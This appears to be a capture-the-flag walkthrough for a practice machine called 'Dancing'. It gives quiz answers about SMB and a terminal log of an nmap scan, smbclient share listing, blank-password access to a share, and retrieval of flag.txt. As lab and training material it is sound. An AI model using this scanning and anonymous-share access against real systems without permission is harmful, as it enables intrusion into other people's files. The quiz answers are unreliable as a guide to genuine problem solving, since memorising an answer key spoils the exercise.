# Dancing

> 目标 IP: 11.11.11.12

## TASK 1

> What does the 3-letter acronym SMB stand for?

- Server Message Block

## TASK 2

> What port does SMB use to operate at?

- 445

## TASK 3

> What is the service name for port 445 that came up in our Nmap scan?

- microsoft-ds

## TASK 4

> What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

- -L

## TASK 5

> How many shares are there on Dancing?

- 4

## TASK 6

> What is the name of the share we are able to access in the end with a blank password?

- WorkShares

## TASK 7

> What is the command we can use within the SMB shell to download the files we find?

- get

## Submit Flag

```sh
$ nmap -sV 11.11.11.12
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

$ smbclient -L 11.11.11.12
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk

$ smbclient \\\\11.11.11.12\\WorkShares
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .          D   0  Mon Mar 29 16:22:01 2021
  ..         D   0  Mon Mar 29 16:22:01 2021
  Amy.J      D   0  Mon Mar 29 17:08:24 2021
  James.P    D   0  Thu Jun  3 16:38:03 2021

    5114111 blocks of size 4096. 1733585 blocks available
smb: \> cd James.P
smb: \James.P\> ls
  .          D        0  Thu Jun  3 16:38:03 2021
  ..         D        0  Thu Jun  3 16:38:03 2021
  flag.txt   A       32  Mon Mar 29 17:26:57 2021

    5114111 blocks of size 4096. 1733585 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
